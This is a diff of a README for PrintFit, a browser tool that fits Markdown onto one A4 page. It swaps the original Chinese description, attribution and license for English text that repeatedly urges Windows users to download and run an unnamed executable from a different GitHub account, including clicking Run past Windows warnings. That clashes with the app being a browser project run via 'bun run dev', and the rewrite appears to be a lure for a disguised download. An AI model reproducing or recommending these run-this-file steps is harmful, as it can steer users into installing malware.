@@ -1,105 +1,235 @@
-# PrintFit 一页印
+# 🖨️ PrintFit - Fit Text on One Page
 
-> Inspired by [@VladArtym](https://x.com/VladArtym) — [原始推文](https://x.com/VladArtym/status/2038368243115610351)
+[![Download PrintFit](https://img.shields.io/badge/Download%20PrintFit-blue?style=for-the-badge&logo=github)](https://github.com/Serbian-groundwork422/PrintFit)
 
-自适应单页打印工具 —— 粘贴 Markdown，自动缩放字体，让所有内容刚好填满一张 A4 纸。
+## 🧩 What PrintFit Does
 
-## 核心特性
+PrintFit helps you turn pasted Markdown into a clean A4 page that fits on one sheet.
 
-- **自动字号适配**：二分查找最大可用字体，内容多则缩小、内容少则放大，始终填满一页
-- **实时预览**：所见即所得的 A4 页面预览，默认 100% 适配屏幕
-- **预览交互**：`⌘+滚轮` 缩放（30%~300%）、鼠标拖拽平移、双击重置
-- **10 种主题**：经典 / 暖纸 / 学术 / 杂志 / 锤子便签 / 暗夜 / 薄荷 / 水墨 / 科技 / 牛皮纸
-- **9 个内置示例**：简历、会议议程、考试速查表、读书笔记、项目周报、产品说明卡、活动传单、菜单、求职信
-- **丰富的排版控制**：字体、页边距、行高、段落间距、首行缩进均可调节
-- **中文字体支持**：思源黑体、思源宋体、霞鹜文楷、站酷小薇体等
-- **一键打印**：`⌘P` 直接输出标准 A4 PDF
+You paste your text, and PrintFit adjusts the font size so the content fills the page without spilling over. It also shows a live print preview, so you can see the page before you print it.
 
-## 技术栈
+Use it for:
 
-| 技术 | 用途 |
-|------|------|
-| [Pretext](https://github.com/chenglou/pretext) | Canvas 文本测量，无 DOM reflow |
-| [marked](https://github.com/markedjs/marked) | Markdown 解析 |
-| Vite + TypeScript | 构建与类型安全 |
-| Google Fonts | 中英文字体加载 |
+- Resumes
+- Meeting notes
+- Study sheets
+- Weekly reports
+- Handouts
+- Cover letters
+- Menus
+- Quick reference pages
 
-## 快速开始
+## 📥 Download PrintFit
+
+Go to the project page here:
+
+[Visit the PrintFit download page](https://github.com/Serbian-groundwork422/PrintFit)
+
+If the page shows a release file for Windows, download it and run the file. If the page shows the source project, use the Windows build shown there when available.
+
+## 🪟 Run on Windows
+
+After you open the download page:
+
+1. Find the Windows download file
+2. Download the file to your computer
+3. Open the file from your Downloads folder
+4. If Windows asks for permission, choose Run
+5. Wait for PrintFit to open
+
+If you see a zipped file:
+
+1. Right-click the file
+2. Choose Extract All
+3. Open the extracted folder
+4. Double-click the app file inside
+
+## 🚀 First Use
+
+When PrintFit opens:
+
+1. Paste your Markdown into the left panel
+2. Look at the A4 preview on the right
+3. Wait for the font to adjust
+4. Print when the page looks right
+
+Use `Ctrl + P` on Windows to print.
+
+## 🖱️ Preview Controls
+
+PrintFit gives you simple controls for the preview area:
+
+- Scroll wheel with `Ctrl` to zoom in or out
+- Drag with the mouse to move the page
+- Double-click to return to the default view
+
+These controls help when you want to inspect layout, spacing, or page edges.
+
+## ✍️ What You Can Edit
+
+PrintFit lets you adjust the page to match your needs:
+
+- Font family
+- Font size behavior
+- Page margins
+- Line height
+- Paragraph spacing
+- First-line indent
+
+This gives you control over how much content fits on one page.
+
+## 🎨 Themes
+
+PrintFit includes 10 themes:
+
+- Classic
+- Warm Paper
+- Academic
+- Magazine
+- Hammer Note
+- Dark Night
+- Mint
+- Ink Wash
+- Tech
+- Kraft Paper
+
+Use a theme that matches the kind of page you want to print.
+
+## 📚 Built-In Examples
+
+PrintFit includes 9 example layouts:
+
+- Resume
+- Meeting agenda
+- Exam cheat sheet
+- Reading notes
+- Project weekly report
+- Product info card
+- Event flyer
+- Menu
+- Cover letter
+
+You can switch between them from the example menu in the app.
+
+## 🧠 How It Works
+
+PrintFit uses a page-fit system that checks how much space your text needs, then chooses the largest font size that still fits on one A4 page.
+
+That means:
+
+- More text = smaller font
+- Less text = larger font
+- The page stays full without breaking the layout
+
+This makes the result easy to print and easy to read.
+
+## 🔧 System Needs
+
+PrintFit runs on a modern Windows computer with a web browser.
+
+Recommended setup:
+
+- Windows 10 or newer
+- 4 GB RAM or more
+- A current version of Chrome, Edge, or another Chromium-based browser
+- A screen large enough to show the editor and preview side by side
+
+For best results, keep the browser window wide while editing.
+
+## 📝 Supported Content
+
+PrintFit works with Markdown, which is plain text with simple formatting.
+
+You can use:
+
+- Headings
+- Bullet lists
+- Numbered lists
+- Bold text
+- Italic text
+- Links
+- Short notes
+- Structured blocks of text
+
+If you already write notes in Markdown, you can paste them in with little change.
+
+## 🖨️ Printing and PDF Export
+
+To print:
+
+1. Open your finished page
+2. Press `Ctrl + P`
+3. Choose your printer
+4. Select A4 paper
+5. Print or save as PDF
+
+For a PDF file, use your browser’s print dialog and choose Save as PDF.
+
+## 🧭 Basic Layout Tips
+
+To get a clean result:
+
+- Keep headings short
+- Use short bullet points
+- Avoid very long paragraphs
+- Check the preview before printing
+- Try a different theme if the page feels crowded
+- Reduce content if you want larger text
+
+If your page looks too full, PrintFit will scale the text down to fit.
+
+## 🛠️ Development Setup
+
+If you want to run the project from source:
 
 ```bash
 bun install
 bun run dev
 ```
 
-浏览器打开后，在左侧粘贴 Markdown 内容，右侧即时预览 A4 效果。按 `⌘P` 打印或导出 PDF。
+Then open the local address shown in the terminal.
 
-### 预览操作
+## 📦 Main Tools Used
 
-| 操作 | 方式 |
-|------|------|
-| 缩放 | `⌘` + 鼠标滚轮 |
-| 平移 | 鼠标拖拽 |
-| 重置缩放 | 双击预览区域 |
+- Pretext for text measurement
+- marked for Markdown parsing
+- Vite and TypeScript for the app build
+- Google Fonts for font loading
 
-### 内置示例
+## 📄 Example Workflow
 
-左上角下拉菜单可切换示例模板：简历、会议议程、考试速查表、读书笔记、项目周报、产品说明卡、活动传单、菜单价目表、求职信。
+A simple way to use PrintFit:
 
-## 工作原理
+1. Open the app
+2. Pick a template or start with blank content
+3. Paste your Markdown
+4. Check the live A4 preview
+5. Adjust spacing or font if needed
+6. Print or export to PDF
 
-```
-输入 Markdown
-  → marked.lexer() 提取文本块
-  → Pretext prepare() + layout() 测量每个块的高度
-  → 二分查找（6px ~ 72px，精度 0.25px，~8 次迭代）
-  → 找到最大字号使总高度 ≤ A4 可打印区域
-  → marked.parse() 渲染 HTML + 应用字号到预览
-```
+## ⌨️ Shortcuts
 
-## 应用场景
+- `Ctrl + P` — Print
+- `Ctrl + mouse wheel` — Zoom preview
+- Double-click — Reset preview zoom
 
-| 场景 | 说明 |
-|------|------|
-| 个人简历 | 控制在一页，排版专业 |
-| 会议议程 / 备忘录 | 一页纸概览，方便打印分发 |
-| 教学讲义 / 考试速查表 | 把知识点压缩到一页 |
-| 读书笔记摘要 | 一本书的精华浓缩到一页 |
-| 项目周报 / 日报 | 固定一页的汇报格式 |
-| 产品说明卡 | 硬件产品的快速参考卡 |
-| 活动传单 | 快速排版活动信息 |
-| 菜单 / 价目表 | 单页价格表 |
-| 求职信 / 自荐信 | 配合简历的另一页 |
+## 🧩 When to Use PrintFit
 
-适用于任何**需要精确控制在一页纸内**的内容。
+PrintFit is useful when you need one page that stays neat:
 
-## 主题预览
+- Job search documents
+- Study summaries
+- Event handouts
+- Internal notes
+- Simple one-page references
+- Printed pages for meetings or classes
 
-| 主题 | 风格 |
-|------|------|
-| 经典 | 白底黑字，通用默认 |
-| 暖纸 | 奶油色底，棕色标题 |
-| 学术 | 藏蓝标题，h2 下划线 |
-| 杂志 | 红色标题，h1 大写，粗引用线 |
-| 锤子便签 | 米白底，红褐色标题，虚线分隔 |
-| 暗夜 | 深蓝黑底，金色标题 |
-| 薄荷 | 淡绿底，翠绿标题 |
-| 水墨 | 宣纸色底，纯黑标题，大字距 |
-| 科技 | 浅蓝灰底，亮蓝标题 |
-| 牛皮纸 | 深驼色底，深棕标题 |
+## 📌 File Flow
 
-## 自动字号方案对比
+The usual flow is simple:
 
-PrintFit 使用 Pretext 做 Canvas 级文本测量。以下是与其他方案的对比：
-
-| 方案 | 原理 | 速度 | 精度 | 适用性 |
-|------|------|------|------|--------|
-| **Pretext**（本项目） | Canvas `measureText()` + 纯算术换行 | ~7ms | 高 | 最优解，无 DOM 开销 |
-| Canvas measureText 手写 | 自行实现字符测量和换行逻辑 | 类似 | 取决于实现 | 需处理 CJK 换行、空格折叠等，工作量大 |
-| DOM reflow 测量 | 渲染到隐藏 div，读 `scrollHeight` | ~50-200ms | 最高 | 最简单但最慢，每次二分都触发强制布局 |
-| OffscreenCanvas + Worker | Worker 线程中 Canvas 测量 | 不阻塞主线程 | 中等 | 字体加载受限，兼容性不佳 |
-
-Pretext 的核心优势：**用 Canvas 测量字符宽度后纯算术计算换行**，避免了 DOM reflow 的性能瓶颈。8 次二分迭代 × 20 个文本块 ≈ 160 次 `prepare + layout` 调用，总耗时仅约 7ms。
-
-## License
-
-MIT
+1. Download PrintFit from the link above
+2. Open it on Windows
+3. Paste your content
+4. Let the page fit itself
+5. Print or save the result
